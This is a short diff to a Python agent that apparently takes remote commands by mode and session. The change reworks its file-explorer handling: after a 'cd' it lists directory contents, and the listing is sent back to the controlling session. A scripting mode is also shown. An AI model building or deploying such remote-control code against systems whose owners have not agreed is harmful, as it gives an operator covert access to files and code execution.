@@ -158,12 +158,13 @@ while 1:
                     elif self.data['mode'] == 'explorerMode' and self.data['payload'].startswith('cd '):
                         try:
                             os.chdir(self.data['payload'][3:])
-                            output = get_content()
                         except:
-                            output = get_content()
+                            pass
+                        output = get_content()
                     # List Directory
                     elif self.data['mode'] == 'explorerMode' and self.data['payload'] == 'getContent':
-                        output = get_content()
+                        data_send(get_content(), mode=self.data['mode'], session_id=self.data['session_id'], module_id=self.data['module_id'])
+                        return
 
                     # Execute Script
                     elif self.data['mode'] == 'scriptingMode':
